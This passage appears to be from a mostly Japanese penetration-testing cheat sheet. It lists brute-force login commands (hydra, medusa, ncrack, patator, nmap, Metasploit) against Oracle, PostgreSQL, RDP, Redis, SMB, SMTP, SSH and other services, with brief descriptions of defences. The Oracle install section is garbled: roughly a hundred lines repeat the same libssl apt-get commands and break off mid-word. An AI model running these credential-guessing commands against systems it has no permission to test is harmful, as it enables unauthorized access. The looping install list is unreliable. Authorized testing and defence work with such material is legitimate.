patator oracle_login sid=<SID> host=<IP> user=FILE0 password=FILE1 0=users-oracle.txt 1=pass-oracle.txt -x ignore:code=ORA-01017

./odat.py passwordguesser -s $SERVER -d $SID
./odat.py passwordguesser -s $MYSERVER -p $PORT --accounts-file accounts_multiple.txt

#msf1
msf> use admin/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORT 1521
msf> set SID <SID>

#msf2, this option uses nmap and it fails sometimes for some reason
msf> use scanner/oracle/oracle_login
msf> set RHOSTS <IP>
msf> set RPORTS 1521
msf> set SID <SID>

#for some reason nmap fails sometimes when executing this script
nmap --script oracle-brute -p 1521 --script-args oracle-brute.sid=<SID> <IP>
```
**oracle_login**を**patator**で使用するためには、以下の手順で**インストール**する必要があります:

```plaintext
$ sudo apt-get install python3-dev python3-pip
$ sudo pip3 install cx_Oracle
$ sudo apt-get install libaio1
$ sudo apt-get install libaio-dev
$ sudo apt-get install libssl-dev
$ sudo apt-get install libffi-dev
$ sudo apt-get install libxml2-dev libxslt1-dev zlib1g-dev
$ sudo apt-get install libjpeg-dev libfreetype6-dev
$ sudo apt-get install libmysqlclient-dev
$ sudo apt-get install libpq-dev
$ sudo apt-get install freetds-dev
$ sudo apt-get install firebird-dev
$ sudo apt-get install libsqlite3-dev
$ sudo apt-get install libmariadbclient-dev
$ sudo apt-get install libldap2-dev libsasl2-dev
$ sudo apt-get install libkrb5-dev
$ sudo apt-get install libpcap-dev
$ sudo apt-get install libssh-dev
$ sudo apt-get install libsnmp-dev
$ sudo apt-get install libssh2-1-dev
$ sudo apt-get install libssh2-1
$ sudo apt-get install libcurl4-openssl-dev
$ sudo apt-get install libssl-dev
$ sudo apt-get install libssl1.0-dev
$ sudo apt-get install libssl1.1
$ sudo apt-get install libssl1.0.2
$ sudo apt-get install libssl1.0.0
$ sudo apt-get install libssl1.0.2-dbg
$ sudo apt-get install libssl1.0.0-dbg
$ sudo apt-get install libssl1.0.2-dbgsym
$ sudo apt-get install libssl1.0.0-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.1-dbg
$ sudo apt-get install libssl1.1-dbgsym
$ sudo apt-get install libssl1.
```bash
pip3 install cx_Oracle --upgrade
```
[オフラインOracleSQLハッシュブルートフォース](../network-services-pentesting/1521-1522-1529-pentesting-oracle-listener/remote-stealth-pass-brute-force.md#outer-perimeter-remote-stealth-pass-brute-force) (**バージョン11.1.0.6、11.1.0.7、11.2.0.1、11.2.0.2**、および**11.2.0.3**)：
```bash
nmap -p1521 --script oracle-brute-stealth --script-args oracle-brute-stealth.sid=DB11g -n 10.11.21.30
```
### POP

POP（Post Office Protocol）は、電子メールの受信に使用されるプロトコルです。POPサーバに接続し、メールボックス内のメッセージをダウンロードすることができます。

POPは、通常、TCPポート110を使用して通信します。POPクライアントは、サーバに接続し、ユーザ名とパスワードを提供して認証します。認証が成功すると、クライアントはメールボックス内のメッセージを取得できます。

POPは、ブルートフォース攻撃の対象になる可能性があります。攻撃者は、一連のパスワードを試し、正しいパスワードを見つけることを試みます。この攻撃を防ぐためには、強力なパスワードポリシーを実装し、アカウントロックアウト機能を使用することが重要です。

また、POPサーバは、セキュリティの脆弱性を持つことがあります。アップデートとパッチの適用を定期的に行うことで、これらの脆弱性を最小限に抑えることができます。

さらに、POPのセキュリティを向上させるためには、SSL/TLSを使用して通信を暗号化することが推奨されます。これにより、データの盗聴や改ざんを防ぐことができます。

POPは便利なプロトコルですが、適切なセキュリティ対策を講じることが重要です。
```bash
hydra -l USERNAME -P /path/to/passwords.txt -f <IP> pop3 -V
hydra -S -v -l USERNAME -P /path/to/passwords.txt -s 995 -f <IP> pop3 -V
```
### PostgreSQL

PostgreSQLは、オープンソースのリレーショナルデータベース管理システムです。PostgreSQLは、高い信頼性、拡張性、データの整合性を提供することで知られています。PostgreSQLは、多くのセキュリティ機能を備えており、データの保護を強化するためのさまざまな手法を提供しています。

#### ブルートフォース攻撃

ブルートフォース攻撃は、総当たり攻撃とも呼ばれ、パスワードや認証情報を推測するために使用される攻撃手法です。この攻撃手法では、すべての可能な組み合わせを試し、正しいパスワードを見つけるまで続けます。

PostgreSQLに対するブルートフォース攻撃を防ぐためには、以下の手法を使用することができます。

- パスワードポリシーの強化: PostgreSQLでは、パスワードの複雑さや有効期限を設定することができます。強力なパスワードポリシーを設定することで、ブルートフォース攻撃のリスクを軽減することができます。

- ログイン試行回数の制限: PostgreSQLでは、ログイン試行回数を制限することができます。一定回数のログイン試行が失敗した場合、アカウントが一時的にロックされるように設定することで、ブルートフォース攻撃を防ぐことができます。

- IPアドレスの制限: PostgreSQLでは、特定のIPアドレスからのアクセスを制限することができます。信頼できるIPアドレスのみがアクセスできるように設定することで、ブルートフォース攻撃を防ぐことができます。

- 二要素認証の使用: PostgreSQLでは、二要素認証を使用することができます。パスワードに加えて、追加の認証要素（例：ワンタイムパスワード）を要求することで、ブルートフォース攻撃をより困難にすることができます。

これらの手法を組み合わせることで、PostgreSQLへのブルートフォース攻撃を効果的に防ぐことができます。
```bash
hydra -L /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP> postgres
medusa -h <IP> –U /root/Desktop/user.txt –P /root/Desktop/pass.txt –M postgres
ncrack –v –U /root/Desktop/user.txt –P /root/Desktop/pass.txt <IP>:5432
patator pgsql_login host=<IP> user=FILE0 0=/root/Desktop/user.txt password=FILE1 1=/root/Desktop/pass.txt
use auxiliary/scanner/postgres/postgres_login
nmap -sV --script pgsql-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 5432 <IP>
```
### PPTP

[https://http.kali.org/pool/main/t/thc-pptp-bruter/](https://http.kali.org/pool/main/t/thc-pptp-bruter/)から`.deb`パッケージをダウンロードしてインストールすることができます。
```bash
sudo dpkg -i thc-pptp-bruter*.deb #Install the package
cat rockyou.txt | thc-pptp-bruter –u <Username> <IP>
```
### RDP

RDP（Remote Desktop Protocol）は、Windowsオペレーティングシステムで使用されるリモートデスクトップ接続プロトコルです。RDPを使用すると、リモートコンピュータに対してキーボード、マウス、ディスプレイなどの入出力デバイスを使用してアクセスできます。

RDPのブルートフォース攻撃は、辞書攻撃や総当たり攻撃を使用して、RDPサーバーの認証情報を推測することを試みます。これにより、攻撃者は正当なユーザーとしてリモートシステムにアクセスできる可能性があります。

以下は、RDPブルートフォース攻撃の手順です。

1. ユーザー名のリストを作成します。一般的なユーザー名や一般的なパターンを使用することができます。

2. パスワードのリストを作成します。一般的なパスワードや辞書攻撃に使用される一般的な単語を含めることができます。

3. ブルートフォースツールを使用して、RDPサーバーに対してユーザー名とパスワードの組み合わせを試行します。

4. 正しいユーザー名とパスワードの組み合わせが見つかるまで、試行を繰り返します。

RDPブルートフォース攻撃は、強力なパスワードポリシーやアカウントロックアウトの設定がない場合に特に効果的です。攻撃者は、リモートシステムへの不正アクセスを試みるために、自動化されたツールを使用することができます。
```bash
ncrack -vv --user <User> -P pwds.txt rdp://<IP>
hydra -V -f -L <userslist> -P <passwlist> rdp://<IP>
```
# Redis

Redisは、高速でオープンソースのキーバリューストアです。データ構造サーバとして機能し、メモリ内でデータを保持します。Redisは、データの読み書きに高速なインメモリ操作を提供し、さまざまなデータ構造（文字列、リスト、セット、ソート済みセット、ハッシュなど）をサポートしています。

## ブルートフォース攻撃

ブルートフォース攻撃は、Redisのパスワードや認証情報を推測するために使用される攻撃手法です。攻撃者は、一連の可能なパスワードを試し、正しいパスワードを見つけることを試みます。

以下は、ブルートフォース攻撃を実行するための一般的な手法です。

1. 辞書攻撃: 事前に作成されたパスワードリストを使用して、パスワードを推測します。
2. パスワードの組み合わせ: 一連の文字や数字の組み合わせを使用して、パスワードを推測します。
3. パスワードの総当たり攻撃: すべての可能な文字や数字の組み合わせを試し、パスワードを推測します。

ブルートフォース攻撃は非常に時間がかかる場合がありますが、弱いパスワードを使用している場合には効果的です。したがって、強力なパスワードポリシーを実装し、ブルートフォース攻撃から保護することが重要です。
```bash
msf> use auxiliary/scanner/redis/redis_login
nmap --script redis-brute -p 6379 <IP>
hydra –P /path/pass.txt redis://<IP>:<PORT> # 6379 is the default
```
### Rexec

Rexec is a remote execution service that allows users to execute commands on a remote system. It is commonly used in network administration and troubleshooting scenarios. Rexec works by establishing a connection between the client and the server, and then sending the command to be executed over this connection.

Brute forcing Rexec involves attempting to guess the username and password combination to gain unauthorized access to the remote system. This can be done by systematically trying different combinations until the correct one is found.

To brute force Rexec, you can use tools like Hydra or Medusa, which are specifically designed for this purpose. These tools automate the process of trying different username and password combinations, making it faster and more efficient.

When brute forcing Rexec, it is important to use a wordlist that contains commonly used usernames and passwords, as well as any specific information you may have about the target system. This can increase the chances of success.

It is worth noting that brute forcing Rexec is a time-consuming process and may not always be successful. Additionally, it is considered unethical and illegal to attempt to gain unauthorized access to systems without proper authorization. Always ensure you have the necessary permissions and legal rights before attempting any hacking activities.
```bash
hydra -l <username> -P <password_file> rexec://<Victim-IP> -v -V
```
### Rlogin

Rlogin is a remote login protocol that allows users to log into a remote system over a network. It is commonly used in Unix-based systems. Rlogin uses the TCP port 513.

#### Brute Forcing Rlogin

To perform a brute force attack on Rlogin, you can use tools like Hydra or Medusa. These tools allow you to automate the process of trying different username and password combinations until a successful login is found.

Here is an example command using Hydra to brute force Rlogin:

```plaintext
hydra -l <username> -P <password_list> rlogin://<target_ip>
```

Replace `<username>` with the target username, `<password_list>` with the path to a file containing a list of passwords, and `<target_ip>` with the IP address of the target system.

It is important to note that brute forcing is a time-consuming process and may be detected by intrusion detection systems. It is recommended to use a targeted approach, such as using a password list specific to the target system or using a password cracking tool like John the Ripper.

#### Mitigating Rlogin Brute Force Attacks

To protect against brute force attacks on Rlogin, you can implement the following measures:

- Use strong and unique passwords for all user accounts.
- Limit the number of login attempts allowed before locking out the user or IP address.
- Implement account lockout policies that temporarily lock user accounts after a certain number of failed login attempts.
- Monitor and analyze logs for suspicious login activity.
- Disable or restrict Rlogin access if it is not necessary for your system's functionality.

By following these best practices, you can reduce the risk of successful brute force attacks on Rlogin.
```bash
hydra -l <username> -P <password_file> rlogin://<Victim-IP> -v -V
```
### Rsh

Rsh (Remote Shell) is a network protocol that allows users to execute commands on a remote system. It is commonly used for remote administration tasks. However, it is important to note that Rsh is considered insecure due to its lack of encryption and authentication mechanisms.

#### Brute Forcing Rsh

Brute forcing Rsh involves systematically trying different combinations of usernames and passwords until the correct credentials are found. This can be done using various tools and scripts that automate the process.

To brute force Rsh, you can use tools like Hydra or Medusa. These tools allow you to specify a list of usernames and passwords, and they will automatically try each combination until a successful login is achieved.

It is important to note that brute forcing Rsh is highly discouraged, as it is illegal and unethical to gain unauthorized access to systems. Always ensure that you have proper authorization before attempting any penetration testing activities.
```bash
hydra -L <Username_list> rsh://<Victim_IP> -v -V
```
[http://pentestmonkey.net/tools/misc/rsh-grind](http://pentestmonkey.net/tools/misc/rsh-grind)

### Rsync

Rsync is a utility commonly used for file synchronization and transfer. It allows for efficient copying and updating of files between different systems. Rsync can be particularly useful during a penetration test for transferring files to and from a target system. By understanding how to use Rsync effectively, you can streamline the process of transferring files during your testing.
```bash
nmap -sV --script rsync-brute --script-args userdb=/var/usernames.txt,passdb=/var/passwords.txt -p 873 <IP>
```
### RTSP

RTSP（Real Time Streaming Protocol）は、ストリーミングメディアを配信するためのプロトコルです。RTSPは、クライアントとサーバー間でメディアの制御情報をやり取りするために使用されます。RTSPは、リアルタイムのビデオやオーディオのストリームを効率的に転送するために設計されています。

RTSPの攻撃手法の一つに、ブルートフォース攻撃があります。ブルートフォース攻撃は、辞書やパスワードのリストを使用して、正しい認証情報を推測することを試みます。攻撃者は、ユーザー名とパスワードの組み合わせを総当たりで試し、正しい組み合わせを見つけることを目指します。

RTSPサーバーのブルートフォース攻撃を防ぐためには、強力なパスワードポリシーを実装し、ユーザーが簡単に推測できない複雑なパスワードを使用することが重要です。また、アカウントロックアウト機能を有効にすることで、一定回数の認証試行が失敗した場合にアカウントをロックすることも有効です。

ブルートフォース攻撃は、RTSPサーバーに対する一般的な攻撃手法の一つですが、適切なセキュリティ対策を講じることで、攻撃者の侵入を防ぐことができます。
```bash
hydra -l root -P passwords.txt <IP> rtsp
```
### SNMP

SNMP（Simple Network Management Protocol）は、ネットワークデバイスの管理と監視に使用されるプロトコルです。SNMPは、ネットワーク上のデバイスの情報を取得し、設定を変更するために使用されます。SNMPは、エージェントとマネージャの間で通信を行います。

SNMPの攻撃は、デバイスの情報を取得したり、設定を変更したりするために使用されます。攻撃者は、デバイスの情報を収集し、ネットワークの脆弱性を特定することができます。また、攻撃者は、デバイスの設定を変更して、ネットワークのセキュリティを侵害することもできます。

SNMPの攻撃には、ブルートフォース攻撃が使用されることがあります。ブルートフォース攻撃では、攻撃者はすべての可能なコミュニティストリングを試し、正しいコミュニティストリングを見つけることを試みます。コミュニティストリングが見つかった場合、攻撃者はデバイスの情報を取得したり、設定を変更したりすることができます。

SNMPの攻撃を防ぐためには、以下の対策を実施することが重要です。

- デフォルトのコミュニティストリングを変更する
- SNMPバージョン2cまたは3を使用する
- SNMPトラップを適切に設定する
- SNMPアクセスを制限する
- SNMPパスワードを強力なものにする

これらの対策を実施することで、SNMPの攻撃からネットワークを保護することができます。
```bash
msf> use auxiliary/scanner/snmp/snmp_login
nmap -sU --script snmp-brute <target> [--script-args snmp-brute.communitiesdb=<wordlist> ]
onesixtyone -c /usr/share/metasploit-framework/data/wordlists/snmp_default_pass.txt <IP>
hydra -P /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt target.com snmp
```
### SMB

SMB（Server Message Block）は、Windowsベースのシステムで使用されるネットワークプロトコルです。SMBは、ファイル共有、プリンタ共有、リモート管理などの機能を提供します。

SMBのブルートフォース攻撃は、SMBサーバーに対して総当たり攻撃を行う手法です。攻撃者は、ユーザー名とパスワードの組み合わせを試行し、正しい認証情報を見つけることを目指します。

ブルートフォース攻撃を実行するためには、ツールやスクリプトを使用することが一般的です。一部のツールは、辞書攻撃やハイブリッド攻撃などの高度な攻撃手法をサポートしています。

SMBサーバーのブルートフォース攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するための効果的な手法です。しかし、攻撃者はアカウントロックアウトやログインアラートなどのセキュリティメカニズムに注意する必要があります。
```bash
nmap --script smb-brute -p 445 <IP>
hydra -l Administrator -P words.txt 192.168.1.12 smb -t 1
```
### SMTP

SMTP（Simple Mail Transfer Protocol）は、電子メールの送信に使用されるプロトコルです。SMTPサーバーに接続し、メールを送信するためのコマンドを使用します。SMTPは、メールアドレスの検証やメールの送信制限などのセキュリティ機能を提供します。

#### ブルートフォース攻撃

ブルートフォース攻撃は、SMTPサーバーへの不正アクセスを試みる手法の一つです。攻撃者は、パスワードの推測や辞書攻撃などの方法を使用して、正しい認証情報を見つけ出そうとします。

以下は、SMTPサーバーへのブルートフォース攻撃を実行するための手順です。

1. ユーザー名のリストを作成します。
2. パスワードのリストを作成します。
3. ユーザー名とパスワードの組み合わせを試し、SMTPサーバーに接続します。
4. 正しい認証情報が見つかるまで、ステップ3を繰り返します。

ブルートフォース攻撃は、強力なパスワードポリシーが実装されていない場合や、弱いパスワードが使用されている場合に特に効果的です。攻撃者は、自動化ツールを使用して大量の認証試行を行うことができます。

ブルートフォース攻撃を防ぐためには、以下の対策を実施することが重要です。

- 強力なパスワードポリシーを実装する。
- ログイン試行回数の制限を設定する。
- IPアドレスベースのブロックリストを使用する。
- 二要素認証を導入する。

ブルートフォース攻撃は、セキュリティ上の脆弱性を突く手法の一つです。攻撃者が正しい認証情報を見つけると、機密情報へのアクセスや不正なメール送信などの悪用が可能となります。したがって、SMTPサーバーのセキュリティを強化するために、適切な対策を講じることが重要です。
```bash
hydra -l <username> -P /path/to/passwords.txt <IP> smtp -V
hydra -l <username> -P /path/to/passwords.txt -s 587 <IP> -S -v -V #Port 587 for SMTP with SSL
```
SOCKS (Socket Secure)は、ネットワークプロトコルの一種であり、プロキシサーバーを介してTCP/IP接続を確立するために使用されます。 SOCKSプロトコルは、クライアントとサーバーの間でデータを転送するためのプロキシチャネルを提供します。 SOCKSプロキシは、ユーザーのIPアドレスを隠すために使用されることがあります。 SOCKSプロキシを使用すると、ユーザーは自分のIPアドレスを隠すことができ、インターネット上のリソースに匿名でアクセスすることができます。

SOCKSプロキシを使用したブルートフォース攻撃では、攻撃者は複数のユーザー名とパスワードの組み合わせを試し、認証を回避するためにプロキシを使用します。攻撃者は、ブルートフォース攻撃を実行するために特別なツールやスクリプトを使用することができます。この攻撃は、弱いパスワードを使用しているユーザーアカウントを特定するために使用されます。

ブルートフォース攻撃は、セキュリティテストや侵入テストの一環として使用されることもあります。セキュリティ専門家は、ブルートフォース攻撃を使用して、システムの脆弱性を特定し、適切な対策を講じることができます。ただし、ブルートフォース攻撃は合法的な目的でのみ使用されるべきであり、不正なアクセスやデータの盗難などの悪意のある行為には使用されるべきではありません。
```bash
nmap  -vvv -sCV --script socks-brute --script-args userdb=users.txt,passdb=/usr/share/seclists/Passwords/xato-net-10-million-passwords-1000000.txt,unpwndb.timelimit=30m -p 1080 <IP>
```
### SSH

SSH（Secure Shell）は、ネットワーク上で安全なリモートアクセスを提供するプロトコルです。SSHを使用すると、暗号化されたトンネルを介してリモートサーバーに接続し、コマンドを実行したりファイルを転送したりすることができます。

SSHのブルートフォース攻撃は、辞書攻撃や総当たり攻撃などの手法を使用して、SSHサーバーの認証情報を推測することを試みます。これにより、攻撃者は正当なユーザーとしてサーバーにアクセスすることができます。

SSHのブルートフォース攻撃を防ぐためには、以下の対策を講じることが重要です。

- 強力なパスワードポリシーを実施する：長さ、複雑さ、一意性の要件を設定し、パスワードの定期的な変更を促す。
- 公開鍵認証を使用する：公開鍵と秘密鍵のペアを生成し、サーバーに公開鍵を登録することで、パスワード認証を回避する。
- ログイン試行回数の制限：一定回数のログイン試行が失敗した場合に、一時的なブロックやCAPTCHAの表示を行う。
- ログ監視とアラート：異常なログイン試行を監視し、異常なアクティビティを検知するためのアラートを設定する。

これらの対策を実施することで、SSHのブルートフォース攻撃からサーバーを保護することができます。
```bash
hydra -l root -P passwords.txt [-t 32] <IP> ssh
ncrack -p 22 --user root -P passwords.txt <IP> [-T 5]
medusa -u root -P 500-worst-passwords.txt -h <IP> -M ssh
patator ssh_login host=<ip> port=22 user=root 0=/path/passwords.txt password=FILE0 -x ignore:mesg='Authentication failed'
```
#### 弱いSSHキー/Debianの予測可能なPRNG
